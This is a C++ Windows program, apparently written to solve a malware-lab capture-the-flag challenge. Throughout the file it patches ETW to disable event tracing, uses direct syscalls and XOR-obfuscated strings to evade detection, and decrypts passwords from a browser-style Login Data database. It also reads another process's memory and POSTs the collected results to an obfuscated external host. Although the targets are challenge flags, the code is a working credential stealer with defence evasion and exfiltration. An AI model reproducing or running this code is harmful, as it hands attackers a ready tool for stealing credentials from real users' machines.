#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include <sstream>
#include "sqlite3.h"

// Link libraries
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "psapi.lib")

// =============================================================
// [完全手動定義區 - 補齊缺失的結構] 
// =============================================================

// 1. 定義 UNICODE_STRING
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// 2. 定義 CLIENT_ID
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

// 3. 定義 OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// 4. [補齊] 定義 IO_STATUS_BLOCK (之前漏掉導致報錯)
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

// 5. 初始化 OBJECT_ATTRIBUTES 的巨集
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
#endif

// 6. 確保 NT_SUCCESS 巨集
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Constants for File I/O
#ifndef FILE_READ_DATA
#define FILE_READ_DATA        0x0001
#endif
#ifndef FILE_SHARE_READ
#define FILE_SHARE_READ       0x0001
#endif
#ifndef FILE_SHARE_WRITE
#define FILE_SHARE_WRITE      0x0002
#endif
#ifndef FILE_OPEN
#define FILE_OPEN             0x00000001
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif
#ifndef FILE_ATTRIBUTE_NORMAL
#define FILE_ATTRIBUTE_NORMAL 0x00000080
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE  0x00000040L
#endif

// ==========================================
// [重要] 手動宣告 Syscalls (對應 Assembly)
// 這裡補齊了之前漏掉的 CreateFile, ReadFile, ReadVirtualMemory
// ==========================================
extern "C" {
    // [補齊]
    NTSTATUS Sw3NtCreateFile(
        PHANDLE FileHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PIO_STATUS_BLOCK IoStatusBlock,
        PLARGE_INTEGER AllocationSize,
        ULONG FileAttributes,
        ULONG ShareAccess,
        ULONG CreateDisposition,
        ULONG CreateOptions,
        PVOID EaBuffer,
        ULONG EaLength
    );

    // [補齊]
    NTSTATUS Sw3NtReadFile(
        HANDLE FileHandle,
        HANDLE Event,
        PVOID ApcRoutine,
        PVOID ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        PVOID Buffer,
        ULONG Length,
        PLARGE_INTEGER ByteOffset,
        PULONG Key
    );

    // [補齊] (之前只有 Write, 漏了 Read)
    NTSTATUS Sw3NtReadVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToRead,
        PSIZE_T NumberOfBytesRead
    );

    NTSTATUS Sw3NtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );

    NTSTATUS Sw3NtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    NTSTATUS Sw3NtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToWrite,
        PSIZE_T NumberOfBytesWritten
    );

    NTSTATUS Sw3NtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );

    NTSTATUS Sw3NtClose(
        HANDLE Handle
    );
}
// ==========================================
// [1. 字串混淆工具]
// ==========================================
template <int X> struct XorString {
    std::string s;
    XorString(const std::string& input) : s(input) {
        for (size_t i = 0; i < s.size(); i++) s[i] ^= X;
    }
    const char* decrypt() {
        for (size_t i = 0; i < s.size(); i++) s[i] ^= X;
        return s.c_str();
    }
    std::string str() {
        std::string temp = s;
        for (size_t i = 0; i < temp.size(); i++) temp[i] ^= X;
        return temp;
    }
};

// SECRET: "0xBGaqjzZL7khGY5AcFs3oi0lIMmkvMF"
const char ENCRYPTED_SECRET[] = {
    0x30 ^ 0x55, 0x78 ^ 0x55, 0x42 ^ 0x55, 0x47 ^ 0x55, 0x61 ^ 0x55, 0x71 ^ 0x55, 0x6A ^ 0x55, 0x7A ^ 0x55,
    0x5A ^ 0x55, 0x4C ^ 0x55, 0x37 ^ 0x55, 0x6B ^ 0x55, 0x68 ^ 0x55, 0x47 ^ 0x55, 0x59 ^ 0x55, 0x35 ^ 0x55,
    0x41 ^ 0x55, 0x63 ^ 0x55, 0x46 ^ 0x55, 0x73 ^ 0x55, 0x33 ^ 0x55, 0x6F ^ 0x55, 0x69 ^ 0x55, 0x30 ^ 0x55,
    0x6C ^ 0x55, 0x49 ^ 0x55, 0x4D ^ 0x55, 0x6D ^ 0x55, 0x6B ^ 0x55, 0x76 ^ 0x55, 0x4D ^ 0x55, 0x46 ^ 0x55, 0x00
};

std::string GetSecret() {
    std::string s(ENCRYPTED_SECRET);
    for (size_t i = 0; i < s.size(); i++) s[i] ^= 0x55;
    return s;
}

// ==========================================
// [2. NT 結構與巨集]
// 這裡移除了手動 struct 定義，改用 Syscalls.h 內的定義
// 只保留巨集以防萬一
// ==========================================

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Constants
#ifndef FILE_READ_DATA
#define FILE_READ_DATA        0x0001
#endif
#ifndef FILE_SHARE_READ
#define FILE_SHARE_READ       0x0001
#endif
#ifndef FILE_SHARE_WRITE
#define FILE_SHARE_WRITE      0x0002
#endif
#ifndef FILE_OPEN
#define FILE_OPEN             0x00000001
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif
#ifndef FILE_ATTRIBUTE_NORMAL
#define FILE_ATTRIBUTE_NORMAL 0x00000080
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE  0x00000040L
#endif

// ==========================================
// [3. Helper Functions]
// ==========================================

void AnsiToUnicode(const char* ansi, UNICODE_STRING* us) {
    int len = MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
    wchar_t* wstr = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, ansi, -1, wstr, len);
    us->Length = (USHORT)((len - 1) * sizeof(wchar_t));
    us->MaximumLength = (USHORT)(len * sizeof(wchar_t));
    us->Buffer = wstr;
}

std::vector<BYTE> HexStringToByteArray(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        bytes.push_back((BYTE)strtoul(byteString.c_str(), NULL, 16));
    }
    return bytes;
}

std::string EscapeJsonString(const std::string& str) {
    std::ostringstream escaped;
    for (char c : str) {
        if (c == '"') escaped << "\\\"";
        else if (c == '\\') escaped << "\\\\";
        else if (c == '\b') escaped << "\\b";
        else if (c == '\f') escaped << "\\f";
        else if (c == '\n') escaped << "\\n";
        else if (c == '\r') escaped << "\\r";
        else if (c == '\t') escaped << "\\t";
        else escaped << c;
    }
    return escaped.str();
}

// ==========================================
// [4. ETW Patch (Stealth + Syscalls)]
// ==========================================
void PatchETW() {
    char s_ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
    HMODULE hNtdll = GetModuleHandleA(s_ntdll);
    if (!hNtdll) return;

    char s_etw[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e','F','u','l','l',0 };
    void* pTarget = GetProcAddress(hNtdll, s_etw);
    if (!pTarget) pTarget = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pTarget) return;

    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };

    PVOID baseAddr = pTarget;
    SIZE_T regionSize = sizeof(patch);
    ULONG oldProtect = 0;
    NTSTATUS status;

    status = Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_READWRITE, &oldProtect);

    if (NT_SUCCESS(status)) {
        SIZE_T bytesWritten = 0;
        status = Sw3NtWriteVirtualMemory(GetCurrentProcess(), pTarget, patch, sizeof(patch), &bytesWritten);

        ULONG tempProtect = 0;
        Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READ, &tempProtect);
    }
}

// ==========================================
// [5. File Reading (Syscalls)]
// ==========================================
std::vector<BYTE> ReadFileSyscall(const char* filePath) {
    std::vector<BYTE> buffer;

    std::string ntPath = "\\??\\";
    ntPath += filePath;

    UNICODE_STRING usPath;
    AnsiToUnicode(ntPath.c_str(), &usPath);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &usPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus = { 0 };
    NTSTATUS status;

    status = Sw3NtCreateFile(&hFile,
        FILE_READ_DATA | SYNCHRONIZE,
        &oa,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0);

    delete[] usPath.Buffer;

    if (NT_SUCCESS(status)) {
        const size_t MAX_READ = 20 * 1024 * 1024;
        buffer.resize(MAX_READ);
        LARGE_INTEGER offset = { 0 };

        status = Sw3NtReadFile(hFile, NULL, NULL, NULL, &ioStatus, buffer.data(), MAX_READ, &offset, NULL);

        if (NT_SUCCESS(status)) {
            buffer.resize(ioStatus.Information);
        }
        else {
            buffer.clear();
        }

        Sw3NtClose(hFile);
    }
    return buffer;
}

// ==========================================
// [6. Crypto Logic]
// ==========================================
std::string DecryptPassword(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& key, const std::vector<BYTE>& iv) {
    HCRYPTPROV hProv = NULL;
    HCRYPTKEY hKey = NULL;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return "";

    struct {
        BLOBHEADER hdr;
        DWORD dwKeySize;
        BYTE rgbKey[32];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.dwKeySize = key.size();
    memcpy(keyBlob.rgbKey, key.data(), key.size());

    HCRYPTKEY hTempKey = NULL;
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(BLOBHEADER) + sizeof(DWORD) + key.size(), 0, 0, &hTempKey)) {
        CryptReleaseContext(hProv, 0);
        return "";
    }
    hKey = hTempKey;
    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0);
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);

    DWORD dataLen = encryptedData.size();
    std::vector<BYTE> decryptedData = encryptedData;
    std::string result = "";
    if (CryptDecrypt(hKey, 0, TRUE, 0, decryptedData.data(), &dataLen)) {
        result = std::string(reinterpret_cast<const char*>(decryptedData.data()), dataLen);
    }
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return result;
}

// ==========================================
// [7. Challenges]
// ==========================================

// Challenge 1: Registry
std::string Challenge1() {
    HKEY hKey;
    char s_reg[] = { 0x6,0x1a,0x13,0x1,0x2,0x14,0x7,0x10,0xd,0x17,0x1a,0x18,0x17,0x10,0 };
    for (int i = 0; s_reg[i] != 0; i++) s_reg[i] ^= 0x55;

    char s_val[] = { 0x34,0x3b,0x26,0x22,0x30,0x27,0xa,0x64,0 };
    for (int i = 0; s_val[i] != 0; i++) s_val[i] ^= 0x55;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, s_reg, 0, KEY_READ, &hKey) != ERROR_SUCCESS) return "";
    char value[1024];
    DWORD valueSize = sizeof(value);
    std::string result = "";
    if (RegQueryValueExA(hKey, s_val, NULL, NULL, (LPBYTE)value, &valueSize) == ERROR_SUCCESS) {
        result = std::string(value);
    }
    RegCloseKey(hKey);
    return result;
}

// Challenge 2: Chrome DB
std::string Challenge2() {
    const char* dbPath = "C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data";

    std::vector<BYTE> fileData = ReadFileSyscall(dbPath);
    if (fileData.empty()) return "FAILED_READ_DB";

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char tempFile[MAX_PATH];
    GetTempFileNameA(tempPath, "tmp", 0, tempFile);

    HANDLE hTempFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTempFile != INVALID_HANDLE_VALUE) {
        DWORD bw = 0;
        WriteFile(hTempFile, fileData.data(), (DWORD)fileData.size(), &bw, NULL);
        CloseHandle(hTempFile);
    }
    else return "ERR_WRITE";

    sqlite3* db;
    std::string finalFlag = "FLAG_NOT_FOUND";

    if (sqlite3_open(tempFile, &db) == SQLITE_OK) {
        char q[] = "SELECT password_value FROM logins";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, q, -1, &stmt, NULL) == SQLITE_OK) {
            std::string secStr = GetSecret();
            std::vector<BYTE> keyBytes(32);
            memcpy(keyBytes.data(), secStr.c_str(), 32);

            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* pwHex = (const char*)sqlite3_column_text(stmt, 0);
                if (pwHex) {
                    std::vector<BYTE> encBytes = HexStringToByteArray(pwHex);
                    if (encBytes.size() >= 32) {
                        std::vector<BYTE> iv(encBytes.begin(), encBytes.begin() + 16);
                        std::vector<BYTE> data(encBytes.begin() + 16, encBytes.end());
                        std::string dec = DecryptPassword(data, keyBytes, iv);
                        if (dec.find("BOMBE_MAL_FLAG_") == 0) {
                            finalFlag = dec;
                            break;
                        }
                    }
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    DeleteFileA(tempFile);
    return finalFlag;
}

// Challenge 3: Memory Scan
std::string Challenge3() {
    char targetName[] = { 0x37,0x26,0x34,0x26,0x26,0x7b,0x30,0x2d,0x30,0 };
    for (int i = 0; targetName[i] != 0; i++) targetName[i] ^= 0x55;

    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, targetName) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    if (pid == 0) return "";

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
    cid.UniqueThread = 0;

    NTSTATUS status = Sw3NtOpenProcess(&hProcess, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &oa, &cid);
    if (!NT_SUCCESS(status)) return "";

    MEMORY_BASIC_INFORMATION mbi;
    PVOID addr = 0;
    std::string result = "";
    std::regex re("BOMBE_MAL_FLAG_[A-Za-z0-9]{32}");

    while (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;

            status = Sw3NtReadVirtualMemory(hProcess, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead);

            if (NT_SUCCESS(status) && bytesRead > 0) {
                std::string content((char*)buf.data(), bytesRead);
                std::smatch match;
                if (std::regex_search(content, match, re)) {
                    result = match.str();
                    break;
                }
            }
        }
        addr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    Sw3NtClose(hProcess);
    return result;
}

// ==========================================
// [8. Network]
// ==========================================
void SendAnswer(const std::string& json) {
    char host[] = { 0x26,0x20,0x37,0x38,0x3c,0x21,0x7b,0x37,0x3a,0x38,0x37,0x30,0x7b,0x21,0x3a,0x25,0 };
    for (int i = 0; host[i] != 0; i++) host[i] ^= 0x55;

    char path[] = { 0x7a,0x26,0x20,0x37,0x38,0x3c,0x21,0x18,0x34,0x39,0x14,0x3b,0x26,0 };
    for (int i = 0; path[i] != 0; i++) path[i] ^= 0x55;

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        int wlen = MultiByteToWideChar(CP_ACP, 0, host, -1, NULL, 0);
        wchar_t* wHost = new wchar_t[wlen];
        MultiByteToWideChar(CP_ACP, 0, host, -1, wHost, wlen);

        HINTERNET hConnect = WinHttpConnect(hSession, wHost, INTERNET_DEFAULT_HTTPS_PORT, 0);
        delete[] wHost;

        if (hConnect) {
            wlen = MultiByteToWideChar(CP_ACP, 0, path, -1, NULL, 0);
            wchar_t* wPath = new wchar_t[wlen];
            MultiByteToWideChar(CP_ACP, 0, path, -1, wPath, wlen);

            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            delete[] wPath;

            if (hRequest) {
                std::wstring headers = L"Content-Type: application/json\r\n";
                WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
                WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json.c_str(), json.length(), json.length(), 0);
                WinHttpReceiveResponse(hRequest, NULL);
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

// ==========================================
// [Main]
// ==========================================
int main() {
    PatchETW();

    std::string a1 = Challenge1();
    std::string a2 = Challenge2();
    std::string a3 = Challenge3();

    std::string secStr = GetSecret();
    std::ostringstream json;
    json << "{\"answer_1\":\"" << EscapeJsonString(a1)
        << "\",\"answer_2\":\"" << EscapeJsonString(a2)
        << "\",\"answer_3\":\"" << EscapeJsonString(a3)
        << "\",\"secret\":\"" << secStr << "\"}";

    SendAnswer(json.str());

    ExitThread(0);
}